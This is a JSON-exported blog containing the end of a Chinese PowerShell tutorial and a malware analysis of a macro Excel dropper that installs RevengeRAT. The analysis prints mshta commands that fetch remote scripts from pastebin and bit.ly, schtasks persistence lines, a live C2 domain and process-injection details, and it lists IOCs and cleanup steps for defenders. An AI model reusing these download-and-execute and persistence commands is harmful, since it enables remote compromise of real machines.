(Select-Object)</h4><blockquote>\n<p><code>Get-CimInstance -Class Win32_LogicalDisk | Select-Object -Property Name,FreeSpace</code></p>\n</blockquote>\n<p>利用WMI win32-logicaldisk类来获取服务器的磁盘空间使用率的信息，然后选择性的打印出 Name和FreeSpace两个项目</p>\n<p>但是FreeSpace是 uint64格式的</p>\n<pre><code class=\"powershell\">Get-CimInstance -Class Win32_LogicalDisk |\n  Select-Object -Property Name, @{\n    label=&#39;FreeSpace Cray&#39;\n    expression={($_.FreeSpace/1GB).ToString(&#39;F2&#39;)}\n  }</code></pre>\n<p>第一行是获取基本数据，第二行是选择对象的属性，分别是Name和一个自定义的</p>\n<p> <code>$_</code> 来指代管道中的当前对象 </p>\n<p><code>ToString(&#39;F2&#39;)</code> 表示保留两位小数</p>\n<h4 id=\"从管道中删除对象-Where-Object\"><a href=\"#从管道中删除对象-Where-Object\" class=\"headerlink\" title=\"从管道中删除对象 (Where-Object)\"></a>从管道中删除对象 (Where-Object)</h4><pre><code class=\"powershell\">Get-CimInstance -Class Win32_SystemDriver |\n  Where-Object {$_.State -eq &quot;Running&quot;} |\n    Where-Object {$_.StartMode -eq &quot;Manual&quot;} |\n      Format-Table -Property Name,DisplayName </code></pre>\n<p><code>Where-Object</code> 作用就是筛选</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">比较运算符</th>\n<th align=\"center\">含义</th>\n<th align=\"center\">示例（返回 True）</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">-eq</td>\n<td align=\"center\">等于</td>\n<td align=\"center\">1 -eq 1</td>\n</tr>\n<tr>\n<td align=\"center\">-ne</td>\n<td align=\"center\">不等于</td>\n<td align=\"center\">1 -ne 2</td>\n</tr>\n<tr>\n<td align=\"center\">-lt</td>\n<td align=\"center\">小于</td>\n<td align=\"center\">1 -lt 2</td>\n</tr>\n<tr>\n<td align=\"center\">-le</td>\n<td align=\"center\">小于或等于</td>\n<td align=\"center\">1 -le 2</td>\n</tr>\n<tr>\n<td align=\"center\">-gt</td>\n<td align=\"center\">大于</td>\n<td align=\"center\">2 -gt 1</td>\n</tr>\n<tr>\n<td align=\"center\">-ge</td>\n<td align=\"center\">大于或等于</td>\n<td align=\"center\">2 -ge 1</td>\n</tr>\n<tr>\n<td align=\"center\">-like</td>\n<td align=\"center\">相似（文本的通配符比较）</td>\n<td align=\"center\">“file.doc” -like “f*.do?”</td>\n</tr>\n<tr>\n<td align=\"center\">-notlike</td>\n<td align=\"center\">不相似（文本的通配符比较）</td>\n<td align=\"center\">“file.doc” -notlike “p*.doc”</td>\n</tr>\n<tr>\n<td align=\"center\">-contains</td>\n<td align=\"center\">包含</td>\n<td align=\"center\">1,2,3 -contains 1</td>\n</tr>\n<tr>\n<td align=\"center\">-notcontains</td>\n<td align=\"center\">不包含</td>\n<td align=\"center\">1,2,3 -notcontains 4</td>\n</tr>\n</tbody></table>\n<pre><code class=\"powershell\">Get-CimInstance -Class Win32_SystemDriver |\n  Where-Object {($_.State -eq &#39;Running&#39;) -and ($_.StartMode -eq &#39;Manual&#39;)} |\n    Format-Table -Property Name,DisplayName</code></pre>\n<p>如果筛选条件有多个，可以使用逻辑运算符</p>\n<p><code>Format-Table</code> 可以格式化最后的输出格式</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Logical and；如果两侧都为 True，则返回 True</th>\n<th align=\"center\">-and</th>\n<th align=\"center\">(1 -eq 1) -and (2 -eq 2)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Logical or；如果某一侧为 True，则返回 True</td>\n<td align=\"center\">-or</td>\n<td align=\"center\">(1 -eq 1) -or (1 -eq 2)</td>\n</tr>\n<tr>\n<td align=\"center\">Logical not；反转 True 和 False</td>\n<td align=\"center\">-not</td>\n<td align=\"center\">-not (1 -eq 2)</td>\n</tr>\n<tr>\n<td align=\"center\">Logical not；反转 True 和 False</td>\n<td align=\"center\">!</td>\n<td align=\"center\">!(1 -eq 2)</td>\n</tr>\n</tbody></table>\n<h4 id=\"对对象进行排序-Sort-Object\"><a href=\"#对对象进行排序-Sort-Object\" class=\"headerlink\" title=\"对对象进行排序( Sort-Object )\"></a>对对象进行排序( Sort-Object )</h4><p>简单使用</p>\n<pre><code class=\"powershell\">Get-ChildItem |\n  Sort-Object -Property CreationTime -Descending  |\n  #Select-Object -Property Name,CreationTime\n  Format-Table -Property Name,CreationTime</code></pre>\n<p>运用哈希排序的复杂使用</p>\n<pre><code class=\"powershell\">Get-ChildItem |\n  Sort-Object -Property @{ Expression = { $_.LastWriteTime - $_.CreationTime }; Descending = $true } |\n  Format-Table -Property LastWriteTime, CreationTime</code></pre>\n<p>对目录中的文件，按最后写日期-创建日期大小进行降序排列</p>\n<h4 id=\"创建-NET-和-COM-对象-New-Object\"><a href=\"#创建-NET-和-COM-对象-New-Object\" class=\"headerlink\" title=\"创建 .NET 和 COM 对象 (New-Object)\"></a>创建 .NET 和 COM 对象 (New-Object)</h4><p>创建某些COM对象</p>\n<pre><code class=\"powershell\">New-Object -ComObject WScript.Shell\nNew-Object -ComObject WScript.Network\nNew-Object -ComObject Scripting.Dictionary\nNew-Object -ComObject Scripting.FileSystemObject</code></pre>\n<p>一个使用<strong>WScript.Shell</strong> 创建桌面快捷方式并执行</p>\n<pre><code class=\"powershell\">$WshShell = New-Object -ComObject WScript.Shell\n$calclink = $WshShell.CreateShortcut(&quot;C:\\Users\\Cray\\Desktop\\calc.lnk&quot;)\n$calclink.TargetPath = &quot;C:\\WINDOWS\\system32\\calc.exe&quot;\n$calclink.Save()\n$WshShell.run(&quot;C:\\Users\\Cray\\Desktop\\calc.lnk&quot;)</code></pre>\n<h4 id=\"使用静态类和方法\"><a href=\"#使用静态类和方法\" class=\"headerlink\" title=\"使用静态类和方法\"></a>使用静态类和方法</h4><p>静态类不能使用New-Object来创建</p>\n<p>无需创建即可使用</p>\n<p>使用时用<strong>[ ]</strong>调用，通常使用静态类的静态方法</p>\n<pre><code class=\"powershell\">[System.Environment] | Get-Member  #此类的详细信息\n[System.Environment] | Get-Member -Static #查看静态成员</code></pre>\n<p>调用方式使用  <strong>::</strong></p>\n<pre><code class=\"powershell\">[System.Environment]::OSVersion </code></pre>\n<p>还有很多静态类，比如 math</p>\n<pre><code class=\"powershell\">PS&gt; [System.Math]::Sqrt(9)\n3\nPS&gt; [System.Math]::Pow(2,3)\n8\nPS&gt; [System.Math]::Floor(3.3)\n3\nPS&gt; [System.Math]::Floor(-3.3)\n-4\nPS&gt; [System.Math]::Ceiling(3.3)\n4\nPS&gt; [System.Math]::Ceiling(-3.3)\n-3\nPS&gt; [System.Math]::Max(2,7)\n7\nPS&gt; [System.Math]::Min(2,7)\n2\nPS&gt; [System.Math]::Truncate(9.3)\n9\nPS&gt; [System.Math]::Truncate(-9.3)\n-9</code></pre>\n<h4 id=\"获取-WMI-对象-Get-CimInstance\"><a href=\"#获取-WMI-对象-Get-CimInstance\" class=\"headerlink\" title=\"获取 WMI 对象 (Get-CimInstance)\"></a>获取 WMI 对象 (Get-CimInstance)</h4><blockquote>\n<p>Windows Management Instrumentation (WMI) 是 Windows 系统管理的核心技术，因为它以统一的方式公开大量信息。 由于 WMI 可实现的效果，用于访问 WMI 对象的 PowerShell cmdlet <code>Get-CimInstance</code> 是进行实际工作最有用的对象之一 </p>\n</blockquote>\n<p>列出本机上可用的WMI类列表</p>\n<pre><code class=\"powershell\">Get-CimClass -Namespace root/CIMV2 |\n  Where-Object CimClassName -like Win32* |\n    Select-Object CimClassName</code></pre>\n<p>使用WMI获取系统信息  Namespace 默认为 <code>root/CIMV2</code> </p>\n<p><code>Get-CimInstance -Class Win32_OperatingSystem</code></p>\n<p>他有很多属性，都可以查看。</p>\n<p>例如</p>\n<pre><code class=\"powershell\"> Get-CimInstance -Class Win32_OperatingSystem | \n select -Property Free*, @{\n label = &quot;TotalVirtualMemorySize&quot; \n expression = {($_.TotalVirtualMemorySize/1MB).ToString(&quot;F0&quot;)}}  | Format-Table </code></pre>\n<p>或者下面这样都是可以的</p>\n<pre><code class=\"powershell\">Get-CimInstance Win32_OperatingSystem |\nFormat-List Total*Memory*, Free*</code></pre>\n<h3 id=\"管理计算机\"><a href=\"#管理计算机\" class=\"headerlink\" title=\"管理计算机\"></a>管理计算机</h3><p>该节有大量关于计算机的例子，建议直接看<a href=\"https://docs.microsoft.com/zh-cn/powershell/scripting/samples/collecting-information-about-computers?view=powershell-7\" target=\"_blank\" rel=\"noopener\">官方文档</a></p>\n<blockquote>\n<p>若要完整显示具有极长名称的临时服务的名称，可能需要使用具有 AutoSize 和 Wrap 参数的 <code>Format-Table</code>，用于优化列宽并允许较长名称换行而不是被截断 </p>\n</blockquote>\n"},{"title":"Lunlayloo 木马","date":"2019-09-06T11:11:22.000Z","index_img":"https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_b10b643428.jpg","banner_img":"https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_b10b643428.jpg","_content":"\n\n## 基本信息\n|FileName| FileType|MD5|Size|\n|--|--|--|--|\n| Order____679873892.xls| rat  |7641FEF8ABC7CB24B66655D11EF3DAF2|41472 bytes|\n\n\n## 简介\n该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。\n\n## 流程图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920124614242.png)\n\n## 详细分析\n\n文件有宏，且宏有密码，可以使用`offkey`直接更改宏密码\n进入宏代码后在`shell(fun)`处下断，可以拿到shell 的连接地址\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916212336956.png) `mshta http://bit.ly/8hsshjahassahsh`\n\n打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917141638561.png)\n拿出来使用`console`打印出来\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917141856253.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917143320931.png)\n处理后执行了`WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide`\n看看究竟是什么东西\n木马作者选择了一个匿名代码存放地址网站，来逃避追踪。\n但是目前这个RWA地址页面已经被删除了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917143741625.png)\n这个样本在any.run上有人运行过，有记录，所以可以找到这个访问记录。\nhttps://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917144032656.png)\n拿出这个代码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917144558325.png)\n下面看看怎么玩的，关闭打开的excel word ppt msp软件，让中马的人以为想不到是宏的原因，给人 眼部见为净 的感觉\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917151722331.png)\n\n接着又安装两个计划任务，来持久化攻击和进一步执行操作\n\n`schtasks /create /sc MINUTE /mo 60 /tn Windows Update /tr mshta.exe http://pastebin.com/raw/vXpe74L2 /F`![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917154541622.png)\n`schtasks /create /sc MINUTE /mo 300 /tn Update /tr mshta.exe http://pastebin.com/raw/JdTuFmc5 /F`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917154555627.png)\n通过schtasks  创建两个计划任务来执行两个脚本文件\n还加入了一个开启自启动\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091715561730.png)\n\n接下来看看这三个脚本是怎么操作的\n\n`JdTuFmc5` 又是一系列加密，下面是解密后的结果\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919105945345.png)\n尝试去下载并执行两个.net编写的可执行程序，暂时命名为`bit1.bin`和`2bit1.bin`后面分析\n\n在`wMG90xwi`这个raw中定义了一个`$a`对象，这个对象是将上面的bit1.bin读入内存的对象，可以直接使用\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919105430408.png)\n使用dnspy打开反编译这个dll\n\n里面就有`THC452563sdfdsdfgr4777cxg04477fsdf810df777`类和它的方法`retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe(string FTONJ, byte[] coco)` \n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919110436546.png)\n然后使用`Invoke`去调用了这个方法，且传入的参数是('MSBuild.exe',$f)\n\n查一下壳，发现是加了`Confuser`的混淆\n\n解完混淆之后再看\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920183121543.png)\n会按照顺序去检测文件`MSBuild.exe`存在在哪，然后调用`ticklens`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920183342286.png)\n`PEHeaderE`函数是在修改程序自身代码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920184816602.png)主要看`FUN`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920184846835.png)\n发现是在循环调用`smethod_0`方法，这个方法就是真正的创建傀儡进程\n\n`lpname` 指向要打开的进程\n\n`lpBuf` 是要注入的数据\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185315420.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019092018553021.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185552483.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185722874.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185657512.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185749272.png)\n上面就是典型的进程注入  作用是将第二个可执行程序注入到`MSBuild.exe`中\n\n这里就直接看一下 这个注入的程序到底是什么\n\n反编译下一个2bit2.bin\n\n根据关键字搜索，可以发现这是`RevengeRAT `远控生成的客户端\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920111854823.png)\n这个远控是一个有免费版本，网络上也有泄露的版本，因为是.net编写，基本功能也都能识别出来\n\n首先是C2地址 `meandmyjoggar.duckdns.org:777`\n\n程序互斥体名 `RV_MUTEX-WindowsUpdateSysten32`\n\n两个计划任务和加入的启动项注册表都是一样的程序，这里就不累述了\n\n**总的来说就是将远控代码注入到一个正常的程序中，来达到执行且躲避安全软件**\n\n\n\n## IOC\n| 域名| 类型 |\n|--|--|\n|http://www.pastebin.com/raw/nv5d9pYu| C&C|\n|http://pastebin.com/raw/vXpe74L2| C&C|\n|http://pastebin.com/raw/JdTuFmc5| C&C|\n|http://pastebin.com/raw/CGe3S2Vf| C&C|\n|https://pastebin.com/raw/wMG90xwi| C&C|\n|https://pastebin.com/raw/W455MkAZ| C&C|\n|meandmyjoggar.duckdns.org:777 | C&C|\n\n\n## 查杀方案\n关闭`MSBuild.exe`进程\n删除计划任务名为`Windows Update`和`Update`的任务\n删除`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AvastUpdate`表项\n删除`Order____679873892.xls`\n\n## 总结\n感染链复杂，控制解密繁琐，多方面控制持久化操作，无文件攻击，技术含量高。个人以及企业中需要时刻面对各种威胁，要时刻保持警惕，防患于未然。\n","source":"_posts/Lunlayloo 木马.md","raw":"---\ntitle: Lunlayloo 木马\ndate: 2019-09-06 19:11:22\nindex_img: https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_b10b643428.jpg\nbanner_img: https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_b10b643428.jpg\ntags:\n    - Rat H-worm\ncategories: 样本详细分析\n---\n\n\n## 基本信息\n|FileName| FileType|MD5|Size|\n|--|--|--|--|\n| Order____679873892.xls| rat  |7641FEF8ABC7CB24B66655D11EF3DAF2|41472 bytes|\n\n\n## 简介\n该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。\n\n## 流程图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920124614242.png)\n\n## 详细分析\n\n文件有宏，且宏有密码，可以使用`offkey`直接更改宏密码\n进入宏代码后在`shell(fun)`处下断，可以拿到shell 的连接地址\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916212336956.png) `mshta http://bit.ly/8hsshjahassahsh`\n\n打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917141638561.png)\n拿出来使用`console`打印出来\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917141856253.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917143320931.png)\n处理后执行了`WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide`\n看看究竟是什么东西\n木马作者选择了一个匿名代码存放地址网站，来逃避追踪。\n但是目前这个RWA地址页面已经被删除了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917143741625.png)\n这个样本在any.run上有人运行过，有记录，所以可以找到这个访问记录。\nhttps://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917144032656.png)\n拿出这个代码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917144558325.png)\n下面看看怎么玩的，关闭打开的excel word ppt msp软件，让中马的人以为想不到是宏的原因，给人 眼部见为净 的感觉\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917151722331.png)\n\n接着又安装两个计划任务，来持久化攻击和进一步执行操作\n\n`schtasks /create /sc MINUTE /mo 60 /tn Windows Update /tr mshta.exe http://pastebin.com/raw/vXpe74L2 /F`![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917154541622.png)\n`schtasks /create /sc MINUTE /mo 300 /tn Update /tr mshta.exe http://pastebin.com/raw/JdTuFmc5 /F`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917154555627.png)\n通过schtasks  创建两个计划任务来执行两个脚本文件\n还加入了一个开启自启动\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091715561730.png)\n\n接下来看看这三个脚本是怎么操作的\n\n`JdTuFmc5` 又是一系列加密，下面是解密后的结果\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919105945345.png)\n尝试去下载并执行两个.net编写的可执行程序，暂时命名为`bit1.bin`和`2bit1.bin`后面分析\n\n在`wMG90xwi`这个raw中定义了一个`$a`对象，这个对象是将上面的bit1.bin读入内存的对象，可以直接使用\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919105430408.png)\n使用dnspy打开反编译这个dll\n\n里面就有`THC452563sdfdsdfgr4777cxg04477fsdf810df777`类和它的方法`retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe(string FTONJ, byte[] coco)` \n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919110436546.png)\n然后使用`Invoke`去调用了这个方法，且传入的参数是('MSBuild.exe',$f)\n\n查一下壳，发现是加了`Confuser`的混淆\n\n解完混淆之后再看\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920183121543.png)\n会按照顺序去检测文件`MSBuild.exe`存在在哪，然后调用`ticklens`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920183342286.png)\n`PEHeaderE`函数是在修改程序自身代码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920184816602.png)主要看`FUN`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920184846835.png)\n发现是在循环调用`smethod_0`方法，这个方法就是真正的创建傀儡进程\n\n`lpname` 指向要打开的进程\n\n`lpBuf` 是要注入的数据\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185315420.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019092018553021.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185552483.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185722874.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185657512.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185749272.png)\n上面就是典型的进程注入  作用是将第二个可执行程序注入到`MSBuild.exe`中\n\n这里就直接看一下 这个注入的程序到底是什么\n\n反编译下一个2bit2.bin\n\n根据关键字搜索，可以发现这是`RevengeRAT `远控生成的客户端\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920111854823.png)\n这个远控是一个有免费版本，网络上也有泄露的版本，因为是.net编写，基本功能也都能识别出来\n\n首先是C2地址 `meandmyjoggar.duckdns.org:777`\n\n程序互斥体名 `RV_MUTEX-WindowsUpdateSysten32`\n\n两个计划任务和加入的启动项注册表都是一样的程序，这里就不累述了\n\n**总的来说就是将远控代码注入到一个正常的程序中，来达到执行且躲避安全软件**\n\n\n\n## IOC\n| 域名| 类型 |\n|--|--|\n|http://www.pastebin.com/raw/nv5d9pYu| C&C|\n|http://pastebin.com/raw/vXpe74L2| C&C|\n|http://pastebin.com/raw/JdTuFmc5| C&C|\n|http://pastebin.com/raw/CGe3S2Vf| C&C|\n|https://pastebin.com/raw/wMG90xwi| C&C|\n|https://pastebin.com/raw/W455MkAZ| C&C|\n|meandmyjoggar.duckdns.org:777 | C&C|\n\n\n## 查杀方案\n关闭`MSBuild.exe`进程\n删除计划任务名为`Windows Update`和`Update`的任务\n删除`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AvastUpdate`表项\n删除`Order____679873892.xls`\n\n## 总结\n感染链复杂，控制解密繁琐，多方面控制持久化操作，无文件攻击，技术含量高。个人以及企业中需要时刻面对各种威胁，要时刻保持警惕，防患于未然。\n","slug":"Lunlayloo 木马","published":1,"updated":"2019-12-07T03:09:15.179Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw628000nccuqosmsb6bd","content":"<h2 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h2><table>\n<thead>\n<tr>\n<th>FileName</th>\n<th>FileType</th>\n<th>MD5</th>\n<th>Size</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Order____679873892.xls</td>\n<td>rat</td>\n<td>7641FEF8ABC7CB24B66655D11EF3DAF2</td>\n<td>41472 bytes</td>\n</tr>\n</tbody></table>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。</p>\n<h2 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h2><p><img src=\"https://img-blog.csdnimg.cn/20190920124614242.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"详细分析\"><a href=\"#详细分析\" class=\"headerlink\" title=\"详细分析\"></a>详细分析</h2><p>文件有宏，且宏有密码，可以使用<code>offkey</code>直接更改宏密码<br>进入宏代码后在<code>shell(fun)</code>处下断，可以拿到shell 的连接地址<br><img src=\"https://img-blog.csdnimg.cn/20190916212336956.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"> <code>mshta http://bit.ly/8hsshjahassahsh</code></p>\n<p>打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的<br><img src=\"https://img-blog.csdnimg.cn/20190917141638561.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>拿出来使用<code>console</code>打印出来<br><img src=\"https://img-blog.csdnimg.cn/20190917141856253.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190917143320931.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>处理后执行了<code>WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide</code><br>看看究竟是什么东西<br>木马作者选择了一个匿名代码存放地址网站，来逃避追踪。<br>但是目前这个RWA地址页面已经被删除了<br><img src=\"https://img-blog.csdnimg.cn/20190917143741625.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这个样本在any.run上有人运行过，有记录，所以可以找到这个访问记录。<br><a href=\"https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/\" target=\"_blank\" rel=\"noopener\">https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/</a><br><img src=\"https://img-blog.csdnimg.cn/20190917144032656.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>拿出这个代码<br><img src=\"https://img-blog.csdnimg.cn/20190917144558325.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>下面看看怎么玩的，关闭打开的excel word ppt msp软件，让中马的人以为想不到是宏的原因，给人 眼部见为净 的感觉</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190917151722331.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>接着又安装两个计划任务，来持久化攻击和进一步执行操作</p>\n<p><code>schtasks /create /sc MINUTE /mo 60 /tn Windows Update /tr mshta.exe http://pastebin.com/raw/vXpe74L2 /F</code><img src=\"https://img-blog.csdnimg.cn/20190917154541622.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><code>schtasks /create /sc MINUTE /mo 300 /tn Update /tr mshta.exe http://pastebin.com/raw/JdTuFmc5 /F</code><br><img src=\"https://img-blog.csdnimg.cn/20190917154555627.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>通过schtasks  创建两个计划任务来执行两个脚本文件<br>还加入了一个开启自启动<br><img src=\"https://img-blog.csdnimg.cn/2019091715561730.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>接下来看看这三个脚本是怎么操作的</p>\n<p><code>JdTuFmc5</code> 又是一系列加密，下面是解密后的结果</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190919105945345.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>尝试去下载并执行两个.net编写的可执行程序，暂时命名为<code>bit1.bin</code>和<code>2bit1.bin</code>后面分析</p>\n<p>在<code>wMG90xwi</code>这个raw中定义了一个<code>$a</code>对象，这个对象是将上面的bit1.bin读入内存的对象，可以直接使用<br><img src=\"https://img-blog.csdnimg.cn/20190919105430408.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>使用dnspy打开反编译这个dll</p>\n<p>里面就有<code>THC452563sdfdsdfgr4777cxg04477fsdf810df777</code>类和它的方法<code>retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe(string FTONJ, byte[] coco)</code> </p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190919110436546.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>然后使用<code>Invoke</code>去调用了这个方法，且传入的参数是(‘MSBuild.exe’,$f)</p>\n<p>查一下壳，发现是加了<code>Confuser</code>的混淆</p>\n<p>解完混淆之后再看<br><img src=\"https://img-blog.csdnimg.cn/20190920183121543.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>会按照顺序去检测文件<code>MSBuild.exe</code>存在在哪，然后调用<code>ticklens</code><br><img src=\"https://img-blog.csdnimg.cn/20190920183342286.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><code>PEHeaderE</code>函数是在修改程序自身代码<br><img src=\"https://img-blog.csdnimg.cn/20190920184816602.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\">主要看<code>FUN</code><br><img src=\"https://img-blog.csdnimg.cn/20190920184846835.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>发现是在循环调用<code>smethod_0</code>方法，这个方法就是真正的创建傀儡进程</p>\n<p><code>lpname</code> 指向要打开的进程</p>\n<p><code>lpBuf</code> 是要注入的数据</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190920185315420.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/2019092018553021.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190920185552483.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190920185722874.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190920185657512.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190920185749272.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>上面就是典型的进程注入  作用是将第二个可执行程序注入到<code>MSBuild.exe</code>中</p>\n<p>这里就直接看一下 这个注入的程序到底是什么</p>\n<p>反编译下一个2bit2.bin</p>\n<p>根据关键字搜索，可以发现这是<code>RevengeRAT</code>远控生成的客户端<br><img src=\"https://img-blog.csdnimg.cn/20190920111854823.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这个远控是一个有免费版本，网络上也有泄露的版本，因为是.net编写，基本功能也都能识别出来</p>\n<p>首先是C2地址 <code>meandmyjoggar.duckdns.org:777</code></p>\n<p>程序互斥体名 <code>RV_MUTEX-WindowsUpdateSysten32</code></p>\n<p>两个计划任务和加入的启动项注册表都是一样的程序，这里就不累述了</p>\n<p><strong>总的来说就是将远控代码注入到一个正常的程序中，来达到执行且躲避安全软件</strong></p>\n<h2 id=\"IOC\"><a href=\"#IOC\" class=\"headerlink\" title=\"IOC\"></a>IOC</h2><table>\n<thead>\n<tr>\n<th>域名</th>\n<th>类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"http://www.pastebin.com/raw/nv5d9pYu\" target=\"_blank\" 